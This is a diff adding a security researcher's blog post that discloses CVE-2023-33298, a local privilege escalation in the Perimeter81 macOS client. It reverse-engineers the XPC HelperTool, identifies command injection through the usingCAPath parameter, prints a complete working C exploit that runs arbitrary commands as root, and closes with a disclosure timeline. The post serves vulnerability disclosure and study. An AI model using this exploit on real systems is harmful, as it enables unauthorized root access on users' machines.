@@ -1,0 +1,347 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta name="description" content="" />
+    <meta name="author" content="" />
+    
+        <title>CVE-2023-33298 - Perimeter81 Local Privilege Escalation</title>
+        <link rel="icon" type="image/x-icon" href="../assets/favicon.ico" />
+    
+    
+        
+            <link href="../css/custom.css" rel="stylesheet"/>
+        
+    
+    
+    <script src="https://use.fontawesome.com/releases/v5.15.4/js/all.js" crossorigin="anonymous"></script>
+    
+    <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
+    
+    
+        <link href="../css/styles.css" rel="stylesheet" />
+        <link href="../css/prism.css" rel="stylesheet" />
+    
+</head>
+
+    <body>
+        
+        <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
+            <div class="container px-4 px-lg-5">
+                <a class="navbar-brand" href="../index.html">Home</a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                    Menu
+                    <i class="fas fa-bars"></i>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarResponsive">
+                    <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../index.html">Home</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../about.html">About</a></li>
+                        
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../pages/cves.html">CVEs</a></li>
+                        
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../pages/exploits.html">Vulnerabilities</a></li>
+                        
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../tags.html">Tags</a></li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        
+        <header class="masthead" style="background-image: url('../assets/img/post-bg.jpg');">
+            <div class="container position-relative px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <div class="post-heading">
+                            <h1>CVE-2023-33298 - Perimeter81 Local Privilege Escalation</h1>
+                            <h2 class="subheading">Exploiting XPC HelperTool to gain LPE</h2>
+                            
+                                <a href="../tags/reverse-engineering.html"><button type="button" class="btn btn-primary btn-sm">reverse-engineering</button></a>
+                            
+                                <a href="../tags/macos.html"><button type="button" class="btn btn-primary btn-sm">macos</button></a>
+                            
+                                <a href="../tags/cve.html"><button type="button" class="btn btn-primary btn-sm">cve</button></a>
+                            
+                            <br><br>
+                            <span class="meta">
+                                Posted by
+                                <a href="#!">NSEcho</a>
+                                on 2023-06-30 00:38:03
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+        
+        <article class="mb-4">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7 ct">
+                        <h1 id="table-of-contents">Table of Contents</h1>
+
+<ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#analysis">Analysis</a></li>
+<li><a href="#full-exploit">Full exploit</a></li>
+<li><a href="#timeline">Timeline</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+
+<h1 id="introduction">Introduction</h1>
+
+<p>Today we will be analyzing CVE-2023-33298 which is Local Privilege Escalation inside the Perimeter81 macOS application. We will be exploiting XPC service misconfiguration along with the Command Injection vulnerability
+to gain <code>root</code> privileges.</p>
+
+<h1 id="analysis">Analysis</h1>
+
+<p>Perimeter81 adds an entry to <em>LaunchDaemons</em>, and we can examine the content of the <code>com.perimeter81.osx.HelperTool.plist</code> located inside <code>/Library/LaunchDaemons/</code> directory.</p>
+
+<p><img src="../images/perimeter_helper_plist_file.png" alt="LaunchDaemon plist file" /></p>
+
+<p>We can see that the key for <code>MachServices</code> is dictionary containing <code>com.perimeter81.osx.HelperTool</code>. This is the name of mach service which is exposed by the
+<em>com.perimeter81.osx.HelperTool</em> binary.</p>
+
+<p>If we now load <code>/Library/PrivilegedHelperTools/com.perimeter81.osx.HelperTool</code> inside the Hopper and search for <code>xpc_connection_create_mach_service</code> we can
+confirm that the function is called with <code>com.perimeter81.osx.HelperTool</code> as first argument.</p>
+
+<p><img src="../images/perimeter_service_creation.png" alt="Mach Service Creation" /></p>
+
+<p>From the image, we can also see that it calls <code>xpc_connection_set_event_handler</code> with <code>&amp;var_40</code>. We can read <a href="https://clang.llvm.org/docs/Block-ABI-Apple.html">documentation</a> and
+conlude that the structure contains <code>isa</code> pointer (which type of block is this), followed by two ints(flags and reserved) and finally <code>void (*invoke)(void *, ...);</code> function pointer
+which points to the actualy compiled block body.</p>
+
+<p>Inside the disassembly, we can see that <code>*(&amp;var_40 + 0x10) = sub_1002169d7;</code> points to <code>sub_1002169d7</code>. Let&rsquo;s now examine this function.</p>
+
+<p><img src="../images/perimeter_first_handler.png" alt="Main connection handler" /></p>
+
+<p>Inside the <code>else</code> we can see another call to <code>xpc_connection_set_event_handler</code> with the block that has <code>invoke</code> pointer set to <code>sub_100216a98</code>. Double clicking on this sub shows the following code.</p>
+
+<p><img src="../images/perimeter_second_handler.png" alt="Peer connection handler" /></p>
+
+<p>Based on this function we can conclude the following:</p>
+
+<ul>
+<li>We need to send the dictionary</li>
+<li><code>type</code> inside the dictionary needs to be <code>rpc</code> or <code>helper_tool_rpc</code>.</li>
+<li>Function <code>sub_100216d6c</code> is called in multiple branches so we will check what that is</li>
+<li>We can also see that we have a line <code>r12 = xpc_dictionary_get_string(r13, &quot;rpc&quot;);</code> followed by the check whether <em>r12</em> is equal to <em>start_connection</em> so we can conclude that the key <em>rpc</em> will contain some kind of function what to do.</li>
+</ul>
+
+<p>Inspecting the <code>sub_100216d6c</code> function shows that it calls <code>-[SDHelperTool handleTargetServiceCommand:withRequest:withReply:]</code>.</p>
+
+<p><img src="../images/perimeter_handletarget.png" alt="HandleTargetService" /></p>
+
+<p>Since this method is a bit bigger, we will show only the beginning and the end of the function which are interesting.</p>
+
+<p><img src="../images/perimeter_check_for_params.png" alt="Check for target service" /></p>
+
+<p>We can see that it tries to extract the <code>parameters</code> and <code>target_service</code> keys. If <code>target_service</code> is NULL, it jumps to <code>loc_10020a119</code>.</p>
+
+<p><img src="../images/perimeter_generalInvoker_create.png" alt="Creation of generalInvoker selector" /></p>
+
+<p>We can see that it saves <code>@selector(generalInvoker)</code> inside the <code>rax</code> register and then jumps back to <code>loc_10020a1c0</code>. <code>loc_10020a1c0</code> just calls <code>handleXPCServiceCommand:withParameters:withReply</code>.</p>
+
+<p><img src="../images/perimeter_handle_xpc.png" alt="Calling handleXPCServiceCommand" /></p>
+
+<p>If we search for &ldquo;generalInvoker&rdquo; in Hopper we can see that we have a match for <code>-[SDHelperTool setup_GeneralInvoker]</code> which allocates new object of class <em>SDHelperTool_InvokerGeneral</em>.</p>
+
+<p><img src="../images/perimeter_helpertool_general_invoker.png" alt="setup_GeneralInvoker" /></p>
+
+<p>Searching for <code>DHelperTool_InvokerGeneral</code> reveals a lot of methods. After digging around a bit, I have found <code>install_SDP_CA:withReply:</code> which calls <code>security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain %@</code> with the value from dictionary under the key <code>usingCAPath</code>. This is typical command injection where we can simply append <code>;</code> followed by the command we want to execute.</p>
+
+<p><img src="../images/perimeter_invokergeneral_search.png" alt="Searching for DHelperTool_InvokerGeneral" /></p>
+
+<p><img src="../images/perimeter_install_sdpca.png" alt="install_SDP_CA method" /></p>
+
+<p>So to recap, our exploit should do the following:</p>
+
+<ul>
+<li>call <code>xpc_connection_create_mach_service</code> with <code>com.perimeter81.osx.HelperTool</code> as a name</li>
+<li>create a dictionary for <strong>properties</strong> with the key <strong>usingCAPath</strong> and value as <strong>; some command to run as root</strong></li>
+<li>create another dictionary that will be our message with <code>type</code> as <code>helper_tool_rpc</code>, <code>rpc</code> as <code>install_SDP_CA</code>, and key <code>parameters</code> set to the previous dictionary</li>
+<li>send the message</li>
+</ul>
+
+<h1 id="full-exploit">Full exploit</h1>
+
+<p>Full exploit looks like the following:</p>
+
+<pre><code class="language-c">#import &lt;Foundation/Foundation.h&gt;
+
+#define NAME &quot;com.perimeter81.osx.HelperTool&quot;
+
+int main(int argc, const char **argv) {
+    if (argc != 2) {
+        printf(&quot;missing cmd to execute\n&quot;);
+        exit(1);
+    }
+
+    xpc_connection_t conn = xpc_connection_create_mach_service(NAME, NULL, 0);
+    xpc_connection_set_event_handler(conn, ^(xpc_object_t object){
+        NSLog(@&quot;client received event: %s&quot;, xpc_copy_description(object));
+    });
+    xpc_connection_resume(conn);
+
+    const char *c = argv[1];
+
+    char cmd[250];
+    sprintf(cmd, &quot;; %s&quot;, c);
+
+    // create dictionary to hold our parameters
+    // method name and its parameters
+    xpc_object_t params = xpc_dictionary_create(NULL, NULL, 0);
+    xpc_dictionary_set_string(params, &quot;usingCAPath&quot;, cmd);
+
+    // create dictionary to send over xpc
+    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
+    xpc_dictionary_set_string(message, &quot;type&quot;, &quot;helper_tool_rpc&quot;);
+    xpc_dictionary_set_string(message, &quot;rpc&quot;, &quot;install_SDP_CA&quot;);
+    xpc_dictionary_set_value(message, &quot;parameters&quot;, params);
+
+    xpc_connection_send_message_with_reply(conn, message, dispatch_get_main_queue(), ^(xpc_object_t object){
+        NSLog(@&quot;Executed cmd: \&quot;%s\&quot;\n&quot;, c);
+    });
+
+
+    // create run loop so we can get async result for our command, otherwise the exploit would exit after sending the 
+    // message
+    dispatch_main();
+
+    return 0;
+}
+
+</code></pre>
+
+<p><img src="../images/perimeter_exploit.png" alt="Running the exploit" /></p>
+
+<h1 id="timeline">Timeline</h1>
+
+<table>
+<thead>
+<tr>
+<th>Date</th>
+<th>Action</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>17 March 2023</td>
+<td>Sent report to Perimeter81</td>
+</tr>
+
+<tr>
+<td>21th March 2023</td>
+<td>Asked for an update, no reply</td>
+</tr>
+
+<tr>
+<td>10th April 2023</td>
+<td>Asked for an update once more, got response that it was wrongly sidetracked</td>
+</tr>
+
+<tr>
+<td>19th April 2023</td>
+<td>Sent mail to see whether they have investigated it and working on it</td>
+</tr>
+
+<tr>
+<td>10th May 2023</td>
+<td>Another mail and got no response</td>
+</tr>
+
+<tr>
+<td>16th May 2023</td>
+<td>Contacted VINCE to coordinate disclosure</td>
+</tr>
+</tbody>
+</table>
+<p>VINCE tried to contact them multiple times without success, so after more than three months I have decided to disclose the vulnerability.</p>
+
+                    </div>
+                </div>
+            </div>
+            
+    
+    <div class="container px-4 px-lg-5">
+        <div class="row gx-4 gx-lg-5 justify-content-center">
+            <div class="col-md-10 col-lg-8 col-xl-7">
+                <h1 id="references">References</h1>
+                <ol>
+                    
+                    <li>
+                        <a href="https://perimeter81.com">https://perimeter81.com</a>
+                    </li>
+                    
+                </ol>
+            </div>
+        </div>
+    </div>
+    
+
+            
+        
+        
+        <footer class="border-top">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <ul class="list-inline text-center">
+                            <li class="list-inline-item">
+                                <a href="@lateralusd_">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                            <li class="list-inline-item">
+                                <a href="https://www.github.com/nsecho">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                            <li class="list-inline-item">
+                                <a href="mailto:xdaemonx@protonmail.com">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                            <li class="list-inline-item">
+                                <a href="https://nsecho.github.io//index.xml">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                        </ul>
+                        <div class="small text-center text-muted fst-italic">Copyright &copy; NSEcho 2023</div>
+                        <div class="small text-center text-muted fst-italic">Made with <a href="https://github.com/lateralusd/bloggy">bloggy</a></div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+        <style>
+            .ct > p img {
+                height: 100%;
+                width: 100%;
+            }
+        </style>
+
+        
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+        
+        <script src="../js/scripts.js"></script>
+        <script src="../js/prism.js"></script>
+    </body>
+</html>
